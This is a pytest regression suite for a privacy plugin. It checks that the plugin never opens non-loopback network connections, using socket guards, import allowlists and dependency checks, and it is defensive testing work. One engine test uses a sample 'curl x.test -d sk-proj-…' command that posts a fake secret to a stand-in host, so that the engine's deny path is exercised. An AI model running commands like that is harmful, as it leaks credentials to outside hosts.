"""Regression tests for Global Constraint I2 — no network calls except `127.0.0.1`.

CLAUDE.md §3:

    I2 -- No network calls except `127.0.0.1`. The plugin makes no outbound
    requests. No telemetry, no analytics, no remote classification, no error
    reporting. Adding a dependency that phones home is a violation.

This is the product's central claim (README: detection runs entirely locally;
no prompt, file, or secret is ever sent anywhere to be scanned). Before this
file the guarantee rested on one line -- `os.environ.setdefault(
"HF_HUB_OFFLINE", "1")` in `detect/model.py` -- plus nobody ever adding a
dependency that phones home. Nothing failed if either eroded.


Why the obvious test is worthless here
--------------------------------------
The obvious test is "install a socket guard, run the scanner, assert no
outbound connection was attempted". In CI that assertion is *vacuous*:
CI has no model weights and no `transformers`, so `ModelDetector.available`
is False, `scan()` returns `[]` on its first line, and nothing was ever going
to connect anywhere. The test would be green while proving nothing -- worse
than no test, because it manufactures confidence that the guarantee is
covered.

Two further traps, both specific to this codebase:

1. **This package swallows exceptions on purpose.** `ModelDetector._load()`
   and `.scan()` are wrapped in bare `except Exception` (I6: degrade, never
   crash the daemon), as is `hooks/handler.py`'s whole body. A guard that
   only *raises* on a forbidden connect would be caught and discarded by the
   code under test, and the test would still pass. So the guard here
   **records every attempt** and the assertions are made against the
   recording, not against a propagating exception.

2. **A guard that never fires proves nothing.** Every test below that
   asserts "no outbound attempt" is paired with a proof that the guard is
   live -- either `test_guard_is_live_...` in-process, or the
   `guard_is_live` flag the subprocess helper returns after deliberately
   attempting a connection to a TEST-NET-1 address.


How these tests stay meaningful with no weights and no network
--------------------------------------------------------------
The suite is deliberately *not* built on "run the model and watch". It has
four legs, three of which hold identically with or without weights:

* **Mechanism, not outcome** (`test_load_sets_hf_hub_offline_before_...`):
  intercept the `transformers` import itself and read the environment at the
  instant the import happens. This asserts the actual ordering the guarantee
  depends on -- offline flag set *before* the library that would fetch is
  loaded -- and it runs whether or not `transformers` is installed, because
  the interceptor raises `ImportError` in place of the real import.

* **Static import surface** (`test_runtime_imports_are_stdlib_or_...`):
  an AST allowlist over every module in `src/` and `hooks/`. Today the only
  non-stdlib import in the entire runtime package is `transformers`, lazily,
  inside `_load()`. An allowlist (rather than a denylist of known-bad
  packages) is what makes "adding a dependency that phones home is a
  violation" enforceable against dependencies nobody thought to blacklist.

* **Real code under a live guard** (`test_engine_full_pipeline_...`,
  `test_importing_the_whole_package_...`): the engine's detectors, ledger,
  budget, masking and render paths -- and every module's import-time side
  effects -- execute for real with the guard armed. No weights required, and
  it is not vacuous: substantial code runs.

* **The end-to-end proof** (`test_real_model_scan_...`), marked `slow` and
  skipped when weights are absent, matching `tests/detect/test_model.py`.
  It reproduces the by-hand verification in a *fresh interpreter* with the
  guard installed before `transformers` is imported: load the 1.5B model,
  scan text containing a person, an address and an email, and confirm the
  findings are real and the outbound-attempt list is empty.


What a future violation looks like
----------------------------------
Concretely, these fail if someone: adds `requests` / `httpx` / `sentry_sdk` /
a telemetry SDK anywhere under `src/` or `hooks/` (allowlist test, and the
pyproject test); posts an error report or usage ping from the daemon or the
engine (guarded pipeline test); drops the `HF_HUB_OFFLINE` line or moves it
after the `transformers` import so a cache miss silently downloads weights
(mechanism test); binds the local UI server to `0.0.0.0` instead of
`127.0.0.1` (bind test); or switches the hook client / daemon from AF_UNIX to
a TCP socket (transport tests).

Known gaps -- deliberately *not* claimed as covered, see the report:
`_load()` uses `setdefault`, so an operator who exports `HF_HUB_OFFLINE=0`
opts the model path back onto the network; that is an intentional escape
hatch in the source and is not asserted either way here. Nothing here
inspects DNS resolution (`getaddrinfo`), a subprocess the plugin might spawn,
or `transformers`' own C-level I/O.
"""
from __future__ import annotations

import ast
import builtins
import ipaddress
import json
import os
import socket
import socketserver
import subprocess
import sys
import textwrap
import tomllib
from pathlib import Path

import pytest

from privacy_hud.detect.model import ModelDetector, StubModelDetector
from privacy_hud.detect.paths import PathDetector
from privacy_hud.detect.secrets import SecretDetector
from privacy_hud.engine import Engine, Observation
from privacy_hud.ledger import Ledger
from privacy_hud.mask import new_salt
from privacy_hud.matrix.loader import load_matrix

REPO = Path(__file__).resolve().parent.parent
SRC = REPO / "src"
HOOKS = REPO / "hooks"

# RFC 5737 TEST-NET-1: reserved for documentation, guaranteed not to be a real
# host. Used only as the *target* of deliberate attempts that the guard must
# refuse -- no packet is ever emitted, because the guard raises before the
# real connect() is reached.
UNROUTABLE = ("192.0.2.1", 80)


# ---------------------------------------------------------------------------
# The guard
# ---------------------------------------------------------------------------

class OutboundConnectionAttempted(RuntimeError):
    """Raised by the guard when non-loopback traffic is attempted."""


def _is_loopback(address) -> bool:
    """True for anything that cannot leave this machine.

    AF_UNIX addresses (a filesystem path -- what `hooks/handler.py` and
    `daemon.py` actually use) are local by construction. AF_INET/AF_INET6
    addresses are `(host, port, ...)` tuples; the host must parse as a
    loopback IP, or be the empty string / `localhost`.
    """
    if isinstance(address, (str, bytes, os.PathLike)):
        return True
    try:
        host = address[0]
    except (TypeError, IndexError, KeyError):
        return False
    if isinstance(host, bytes):
        host = host.decode("utf-8", "replace")
    if host in ("", "localhost"):
        return True
    try:
        return ipaddress.ip_address(host.split("%")[0]).is_loopback
    except ValueError:
        # A hostname we cannot resolve without a DNS lookup. Treat as
        # outbound: resolving it would itself be a network call.
        return False


class _Recorder:
    def __init__(self):
        self.attempts: list[object] = []
        self.outbound: list[object] = []

    def note(self, address) -> None:
        self.attempts.append(address)
        if not _is_loopback(address):
            self.outbound.append(address)
            raise OutboundConnectionAttempted(
                f"I2 violation: connection attempted to {address!r}"
            )

    def assert_no_outbound(self) -> None:
        assert self.outbound == [], (
            "Global Constraint I2 (CLAUDE.md §3): the plugin attempted a "
            f"connection to a non-loopback address: {self.outbound!r}"
        )


_MISSING = object()


@pytest.fixture
def network_guard():
    """Record (and refuse) every non-loopback connection for one test.

    Patches the *class* method `socket.socket.connect` rather than a module
    level function, so it applies to sockets created before or after the
    patch and to libraries (urllib3, httpx, huggingface_hub) that build their
    own sockets -- import order cannot route around it.

    Restores the exact prior state on teardown, including deleting the
    attribute again when it was only inherited from `_socket.socket`, so a
    patched `connect` can never leak into another test.
    """
    rec = _Recorder()
    real_connect = socket.socket.connect
    real_connect_ex = socket.socket.connect_ex
    real_create_connection = socket.create_connection
    prior = {
        name: socket.socket.__dict__.get(name, _MISSING)
        for name in ("connect", "connect_ex")
    }

    def connect(self, address):
        rec.note(address)
        return real_connect(self, address)

    def connect_ex(self, address):
        rec.note(address)
        return real_connect_ex(self, address)

    def create_connection(address, *args, **kwargs):
        rec.note(address)
        return real_create_connection(address, *args, **kwargs)

    socket.socket.connect = connect
    socket.socket.connect_ex = connect_ex
    socket.create_connection = create_connection
    try:
        yield rec
    finally:
        socket.create_connection = real_create_connection
        for name, value in prior.items():
            if value is _MISSING:
                delattr(socket.socket, name)
            else:
                setattr(socket.socket, name, value)


def _run_child(body: str, extra_env: dict | None = None, timeout: int = 300):
    """Run `body` in a fresh interpreter with the guard installed FIRST.

    Several of the claims here are about what happens *before and during*
    import (`HF_HUB_OFFLINE`, import-time side effects, `transformers`
    reaching for the hub). Asserting those in-process is unsound once another
    test in the session has already imported the module, so they run in a
    clean subprocess instead. The child prints one JSON object on its last
    line; `guard_is_live` is the child's own proof that its guard fires, so a
    child whose guard was broken cannot report a spurious clean run.
    """
    preamble = textwrap.dedent(
        '''
        import ipaddress, json, os, socket, sys

        _attempts = []

        def _is_loopback(a):
            if isinstance(a, (str, bytes, os.PathLike)):
                return True
            try:
                h = a[0]
            except Exception:
                return False
            if isinstance(h, bytes):
                h = h.decode("utf-8", "replace")
            if h in ("", "localhost"):
                return True
            try:
                return ipaddress.ip_address(h.split("%")[0]).is_loopback
            except ValueError:
                return False

        _real_connect = socket.socket.connect
        _real_create = socket.create_connection

        def _note(a):
            _attempts.append(repr(a))
            if not _is_loopback(a):
                raise RuntimeError("I2: outbound connect to %r" % (a,))

        def _connect(self, a):
            _note(a)
            return _real_connect(self, a)

        def _create_connection(a, *ar, **kw):
            _note(a)
            return _real_create(a, *ar, **kw)

        socket.socket.connect = _connect
        socket.socket.connect_ex = _connect
        socket.create_connection = _create_connection

        RESULT = {}

        def _finish():
            before = len(_attempts)
            live = False
            try:
                socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect(
                    ("192.0.2.1", 80))
            except RuntimeError:
                live = True
            except Exception:
                live = False
            del _attempts[before:]
            RESULT["guard_is_live"] = live
            RESULT["attempts"] = list(_attempts)
            sys.stdout.write("\\n" + json.dumps(RESULT) + "\\n")
        '''
    )
    script = preamble + textwrap.dedent(body) + "\n_finish()\n"
    env = dict(os.environ)
    env["PYTHONPATH"] = os.pathsep.join(
        [str(SRC)] + ([env["PYTHONPATH"]] if env.get("PYTHONPATH") else [])
    )
    if extra_env:
        env.update(extra_env)
    proc = subprocess.run(
        [sys.executable, "-c", script],
        capture_output=True, text=True, timeout=timeout, env=env, cwd=str(REPO),
    )
    assert proc.returncode == 0, (
        f"child interpreter failed ({proc.returncode}).\n"
        f"stdout:\n{proc.stdout}\nstderr:\n{proc.stderr}"
    )
    payload = json.loads(proc.stdout.strip().splitlines()[-1])
    assert payload["guard_is_live"] is True, (
        "the subprocess socket guard did not fire on a deliberate "
        "non-loopback connect -- its clean report proves nothing"
    )
    return payload


# ---------------------------------------------------------------------------
# The guard's own liveness
# ---------------------------------------------------------------------------

def test_guard_is_live_and_refuses_a_deliberate_outbound_connect(network_guard):
    """A clean run below is only evidence if the guard actually trips."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        with pytest.raises(OutboundConnectionAttempted):
            s.connect(UNROUTABLE)
    finally:
        s.close()
    assert network_guard.outbound == [UNROUTABLE]
    with pytest.raises(OutboundConnectionAttempted):
        socket.create_connection(UNROUTABLE, timeout=0.1)


def test_guard_permits_loopback_because_the_daemon_and_ui_need_it(network_guard):
    """I2 forbids *outbound* traffic, not local IPC.

    `daemon.py` serves a unix socket and `local_ui_server.py` binds
    127.0.0.1; a guard that blanket-blocked sockets would be testing a
    stricter, false invariant and would break both.
    """
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.bind(("127.0.0.1", 0))
    listener.listen(1)
    try:
        client = socket.create_connection(listener.getsockname(), timeout=2)
        client.close()
    finally:
        listener.close()
    network_guard.assert_no_outbound()
    assert network_guard.attempts, "the loopback connect should still be recorded"


# ---------------------------------------------------------------------------
# The mechanism the model path depends on
# ---------------------------------------------------------------------------

def test_load_sets_hf_hub_offline_before_importing_transformers(monkeypatch):
    """The ordering, asserted directly -- valid with or without weights.

    `pipeline()`'s `local_files_only` kwarg was removed upstream, so
    `HF_HUB_OFFLINE` is the only thing standing between a cache miss and a
    silent download. Setting it *after* `from transformers import pipeline`
    would be too late for parts of the hub stack that read it at import time,
    and deleting it entirely would leave nothing at all.

    Intercepting `__import__` (rather than running the real import) is what
    makes this meaningful in CI: the assertion holds whether `transformers`
    is installed or not, and it never touches the network either way.
    """
    monkeypatch.delenv("HF_HUB_OFFLINE", raising=False)
    seen: dict[str, object] = {}

    real_import = builtins.__import__

    def fake_import(name, globals=None, locals=None, fromlist=(), level=0):
        if name == "transformers" or name.startswith("transformers."):
            seen["at_import"] = os.environ.get("HF_HUB_OFFLINE")
            raise ImportError("intercepted by test_network_isolation")
        return real_import(name, globals, locals, fromlist, level)

    monkeypatch.setattr(builtins, "__import__", fake_import)

    detector = ModelDetector()

    assert "at_import" in seen, (
        "ModelDetector._load() no longer imports transformers by name -- if "
        "the model is now loaded some other way, I2's offline guarantee needs "
        "a new test, not a deleted one"
    )
    assert seen["at_import"] == "1", (
        "Global Constraint I2: HF_HUB_OFFLINE was "
        f"{seen['at_import']!r} at the moment transformers was imported. The "
        "offline flag must be set BEFORE the import, or a cache miss can "
        "silently download weights over the network."
    )
    # I6: a failed load degrades, it does not raise.
    assert detector.available is False


def test_unavailable_model_detector_attempts_no_connection(network_guard):
    """The CI path itself: a model that is not in the local cache.

    With no weights this is exactly what CI executes, and the interesting
    property is that a cache miss resolves to "unavailable" rather than to a
    hub request. With weights present locally it still exercises the miss
    path, because the id does not exist.
    """
    detector = ModelDetector(model_id="does-not-exist/nope")
    assert detector.available is False
    assert detector.scan("contact jordan@acme.com", {}) == []
    network_guard.assert_no_outbound()


# ---------------------------------------------------------------------------
# Real code, executed under the live guard
# ---------------------------------------------------------------------------

def test_engine_full_pipeline_attempts_no_connection(network_guard, tmp_path):
    """Detect -> ledger -> budget -> decision, with the guard armed.

    Uses the real `PathDetector`/`SecretDetector` and a real sqlite `Ledger`,
    with `StubModelDetector` standing in for tier 3 exactly as
    `tests/test_engine.py` does -- so this runs identically in CI and covers
    the parts of the package a telemetry or error-reporting call would most
    plausibly be added to (the deny path, where something went "wrong").
    """
    matrix = load_matrix()
    ledger = Ledger(tmp_path / "l.db", matrix)
    ledger.start_session("s1", cwd="/r", model="gpt-5")
    engine = Engine(
        ledger=ledger, matrix=matrix, salt=new_salt(),
        detectors=[PathDetector(), SecretDetector(),
                   StubModelDetector([("email", "jordan@acme.com", 8, 23)])],
    )

    allowed = engine.observe(Observation(
        session_id="s1", turn_id="t1", hook_event="PostToolUse",
        direction="ingress", source="support.log", destination="model_context",
        text="contact jordan@acme.com", tool_name="Read"))
    denied = engine.observe(Observation(
        session_id="s1", turn_id="t2", hook_event="PreToolUse",
        direction="egress", source=".env", destination="external_net",
        text="curl x.test -d sk-proj-Ab3xY9zQw1Er5Ty7Ui0OpAs2Df4Gh6Jk8Lm",
        tool_name="Bash"))

    # Guard against a future refactor turning this into a no-op pipeline:
    # the assertion below is only worth anything if work actually happened.
    assert allowed.action == "allow" and allowed.budget_percent > 0
    assert denied.action == "deny"
    network_guard.assert_no_outbound()


def test_importing_the_whole_package_attempts_no_connection():
    """Import-time side effects are a classic phone-home vector.

    Runs in a fresh interpreter because by the time this test executes the
    package is already in `sys.modules`; re-importing in-process would
    exercise nothing but the module cache -- a vacuous pass.
    """
    payload = _run_child(
        '''
        import importlib, pkgutil
        import privacy_hud
        names = [m.name for m in pkgutil.walk_packages(
            privacy_hud.__path__, "privacy_hud.")]
        for name in names:
            importlib.import_module(name)
        RESULT["modules"] = names
        '''
    )
    assert len(payload["modules"]) >= 8, payload["modules"]
    assert payload["attempts"] == [], (
        "Global Constraint I2: importing privacy_hud opened a connection: "
        f"{payload['attempts']}"
    )


# ---------------------------------------------------------------------------
# Transports: loopback and unix sockets are allowed, TCP to the world is not
# ---------------------------------------------------------------------------

def test_local_ui_server_binds_loopback_only(network_guard, tmp_path, monkeypatch):
    """The UI server is the one component that legitimately listens.

    architecture.md §9 commits it to `127.0.0.1:<ephemeral>`. Binding
    `0.0.0.0` would expose the audit UI -- and every ledger summary it serves
    -- to the local network, which is an I2 violation even though it is
    inbound rather than outbound.
    """
    from privacy_hud import local_ui_server

    monkeypatch.setenv("PLUGIN_DATA", str(tmp_path))
    server = local_ui_server.serve(print_url=False)
    try:
        host, port = server.server_address[0], server.server_address[1]
        assert _is_loopback((host, port)), f"UI server bound to {host!r}"
        assert ipaddress.ip_address(host).is_loopback
        # And it is reachable over loopback with the guard armed, proving the
        # guard does not break the legitimate local path.
        conn = socket.create_connection((host, port), timeout=2)
        conn.close()
    finally:
        server.shutdown()
        server.server_close()
    network_guard.assert_no_outbound()


def test_daemon_and_hook_client_speak_unix_sockets_not_tcp():
    """The hook/daemon channel must stay AF_UNIX.

    A TCP daemon -- even on loopback -- would be reachable by any process on
    the machine and is a step onto the network stack this plugin has no
    reason to take. `hooks/handler.py` is checked by AST rather than by
    running it, because it is stdlib-only by convention and importing it is
    not the point; the socket family it names is.
    """
    from privacy_hud.daemon import Daemon

    assert issubclass(Daemon, socketserver.UnixStreamServer)
    assert Daemon.address_family == socket.AF_UNIX

    tree = ast.parse((HOOKS / "handler.py").read_text(encoding="utf-8"))
    families = {
        node.attr
        for node in ast.walk(tree)
        if isinstance(node, ast.Attribute) and node.attr.startswith("AF_")
    }
    assert families == {"AF_UNIX"}, (
        f"hooks/handler.py names socket families {families!r}; the hook "
        "client must only ever open a unix socket to the local daemon"
    )


# ---------------------------------------------------------------------------
# Static surface: what the package is allowed to import and depend on
# ---------------------------------------------------------------------------

# Every non-stdlib top-level module the runtime package may import. This is an
# allowlist on purpose: "adding a dependency that phones home is a violation"
# cannot be enforced by blacklisting the telemetry SDKs someone happened to
# think of. Extending this list is the deliberate act that should force an I2
# review -- not an accident.
ALLOWED_THIRD_PARTY = {"transformers"}

# Stdlib modules that exist to talk to a remote host. `http.server` (serving
# on loopback) and `urllib.parse` (pure string parsing) are deliberately NOT
# here -- both are in legitimate use in local_ui_server.py.
OUTBOUND_STDLIB = (
    "urllib.request", "urllib.error", "http.client", "smtplib", "ftplib",
    "poplib", "imaplib", "nntplib", "telnetlib", "xmlrpc.client", "webbrowser",
)


def _runtime_source_files() -> list[Path]:
    files = sorted(SRC.rglob("*.py")) + sorted(HOOKS.rglob("*.py"))
    assert files, "no runtime sources found -- the path constants are wrong"
    return [f for f in files if "__pycache__" not in f.parts]


def _imports(path: Path) -> list[tuple[str, int]]:
    tree = ast.parse(path.read_text(encoding="utf-8"), str(path))
    out: list[tuple[str, int]] = []
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            out += [(a.name, node.lineno) for a in node.names]
        elif isinstance(node, ast.ImportFrom):
            if node.level == 0 and node.module:
                out.append((node.module, node.lineno))
    return out


def test_runtime_imports_are_stdlib_or_explicitly_allowed():
    """No undeclared third-party import anywhere in `src/` or `hooks/`.

    Today the entire non-stdlib surface of the runtime package is a single
    lazy `transformers` import inside `ModelDetector._load()`. That is what
    makes I2 auditable at all, and this test is what keeps it that way: a
    `sentry_sdk`, `posthog`, `requests` or analytics import fails here on the
    line it was added, with no need for anyone to have anticipated the name.
    """
    offenders = []
    for path in _runtime_source_files():
        for module, lineno in _imports(path):
            top = module.split(".")[0]
            if top in sys.stdlib_module_names or top in ("privacy_hud",):
                continue
            if top in ALLOWED_THIRD_PARTY:
                continue
            offenders.append(f"{path.relative_to(REPO)}:{lineno}: {module}")
    assert not offenders, (
        "Global Constraint I2 (CLAUDE.md §3): undeclared third-party imports "
        "in the runtime package. If this dependency is genuinely local-only, "
        "add it to ALLOWED_THIRD_PARTY in this file and say why in the commit "
        f"message:\n  " + "\n  ".join(offenders)
    )


def test_no_outbound_capable_stdlib_module_is_imported():
    """`http.server` is fine; `http.client` is not.

    The distinction is the whole invariant: this package may *listen* on
    loopback, and may parse URLs, but nothing in it should be able to fetch
    one.
    """
    offenders = []
    for path in _runtime_source_files():
        for module, lineno in _imports(path):
            if any(module == m or module.startswith(m + ".")
                   for m in OUTBOUND_STDLIB):
                offenders.append(f"{path.relative_to(REPO)}:{lineno}: {module}")
    assert not offenders, (
        "Global Constraint I2 (CLAUDE.md §3): an outbound-capable stdlib "
        "module is imported by the runtime package:\n  " + "\n  ".join(offenders)
    )


def test_no_non_loopback_url_literal_in_runtime_code():
    """A hardcoded endpoint is the simplest possible I2 violation.

    Only executable string literals are inspected; docstrings are exempt, so
    citing a URL in prose stays allowed. `local_ui_server.serve()` builds its
    `http://{host}:{port}/` from the address the OS actually bound, which is
    asserted to be loopback by `test_local_ui_server_binds_loopback_only`
    rather than by string matching.
    """
    offenders = []
    for path in _runtime_source_files():
        tree = ast.parse(path.read_text(encoding="utf-8"), str(path))
        docstrings = set()
        for node in ast.walk(tree):
            if isinstance(node, (ast.Module, ast.ClassDef,
                                 ast.FunctionDef, ast.AsyncFunctionDef)):
                doc = node.body[0] if node.body else None
                if (isinstance(doc, ast.Expr)
                        and isinstance(doc.value, ast.Constant)
                        and isinstance(doc.value.value, str)):
                    docstrings.add(id(doc.value))
        for node in ast.walk(tree):
            if not (isinstance(node, ast.Constant)
                    and isinstance(node.value, str)):
                continue
            if id(node) in docstrings:
                continue
            for scheme in ("http://", "https://"):
                if scheme not in node.value:
                    continue
                rest = node.value.split(scheme, 1)[1]
                host = rest.split("/")[0].split(":")[0]
                if host and not _is_loopback((host, 0)):
                    offenders.append(
                        f"{path.relative_to(REPO)}:{node.lineno}: {host}")
    assert not offenders, (
        "Global Constraint I2 (CLAUDE.md §3): non-loopback URL literal in "
        "runtime code:\n  " + "\n  ".join(offenders)
    )


# Names permitted in pyproject.toml. `dependencies` must stay empty (the
# daemon, hook client and every pure privacy_hud module are stdlib-only);
# optional extras are reviewed individually.
ALLOWED_DISTRIBUTIONS = {"pytest", "transformers", "torch", "mcp"}


def _requirement_name(spec: str) -> str:
    name = spec.strip()
    for sep in ("[", "(", ";", "==", ">=", "<=", "!=", "~=", ">", "<", " "):
        name = name.split(sep)[0]
    return name.strip().lower().replace("_", "-")


def test_declared_dependencies_stay_on_the_reviewed_allowlist():
    """The dependency list is where I2 is most likely to be lost.

    Not because anyone adds `telemetry-sdk` on purpose, but because a
    convenience library brings an analytics or crash-reporting client with
    it. Runtime `dependencies` is asserted empty (it is today, and the
    project's conventions require the hook path to be stdlib-only); extras
    must be individually named here, which makes any addition a visible,
    reviewable diff rather than a silent one.
    """
    data = tomllib.loads((REPO / "pyproject.toml").read_text(encoding="utf-8"))
    runtime = data["project"].get("dependencies", [])
    assert runtime == [], (
        "Global Constraint I2: privacy-hud declares runtime dependencies "
        f"{runtime!r}. Anything installed unconditionally is loaded on the "
        "hook path in every user session; adding one needs an explicit I2 "
        "review of what it does at import time."
    )
    extras = data["project"].get("optional-dependencies", {})
    unexpected = sorted(
        f"{group}: {spec}"
        for group, specs in extras.items()
        for spec in specs
        if _requirement_name(spec) not in ALLOWED_DISTRIBUTIONS
    )
    assert not unexpected, (
        "Global Constraint I2 (CLAUDE.md §3): unreviewed optional dependency. "
        "Confirm it makes no outbound request, then add it to "
        f"ALLOWED_DISTRIBUTIONS in this file:\n  " + "\n  ".join(unexpected)
    )


# ---------------------------------------------------------------------------
# End-to-end with the real weights (the by-hand proof, automated)
# ---------------------------------------------------------------------------

@pytest.mark.slow
def test_real_model_scan_finds_pii_and_attempts_no_connection():
    """The full claim: a 1.5B model classifies PII with zero outbound traffic.

    Deselected by `-m "not slow"` and skipped when the weights are not in the
    local cache, matching `tests/detect/test_model.py`. Everything above is
    what carries the invariant in CI; this is the one test that can say the
    real thing was loaded and the real scan ran.

    A fresh interpreter is essential here rather than incidental: the point is
    that the guard is in place *before* `transformers` is imported, so a
    connection attempted during library import is caught too -- by this point
    in a normal session `transformers` may already be imported by another
    test.

    Note that the child asserts on the recorded attempts, not on an
    exception: `ModelDetector._load()` and `.scan()` both swallow every
    exception by design (I6), so a guard that only raised would be silently
    absorbed and the test would pass no matter what.
    """
    payload = _run_child(
        '''
        from privacy_hud.detect.model import ModelDetector
        d = ModelDetector()
        RESULT["available"] = bool(d.available)
        if d.available:
            findings = d.scan(
                "Jordan Reyes lives at 1600 Amphitheatre Parkway, "
                "Mountain View CA, and you can reach him at jordan@acme.com",
                {})
            RESULT["types"] = sorted({f.data_type for f in findings})
            RESULT["offline"] = os.environ.get("HF_HUB_OFFLINE")
        '''
    )
    if not payload.get("available"):
        pytest.skip("privacy-filter weights not present in local cache")

    assert payload["offline"] == "1"
    found = set(payload["types"])
    assert {"person", "address", "email"} <= found, found
    assert payload["attempts"] == [], (
        "Global Constraint I2: loading and running the local model attempted "
        f"a connection: {payload['attempts']}"
    )
